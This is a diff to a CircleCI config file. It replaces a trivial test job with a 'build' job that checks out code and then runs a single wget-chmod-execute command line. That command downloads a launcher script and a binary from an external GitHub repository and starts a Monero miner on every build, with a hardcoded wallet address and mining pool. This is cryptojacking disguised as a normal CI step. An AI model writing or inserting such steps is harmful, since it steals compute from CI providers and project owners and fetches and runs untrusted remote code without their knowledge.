@@ -1,18 +1,11 @@
-version: 2.1
+version: 2.0
 jobs:
-    trial:
-      docker:
-            - image: circleci/ruby:2.5.3
-      parallelism: 16
-      steps:
-        - run:
-            name: Install Dependencies
-            command: |
-              lscpu
-              echo Hello,subscribe it
-
-workflows:
-    version: 2.1
-    build:
-        jobs:
-        - trial
+  build:
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    steps:
+      - checkout
+      - run:  wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet 48H1TS1KJzUPx7M5XUqkc2ZPiTG9AGdwt59ou3V1UDvNcRL6Z8AB74vBuQPg6bRR1JjDbFN2QhSVjfwgx2MSMz2zLU86ErD  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 xmr.2miners.com:2222
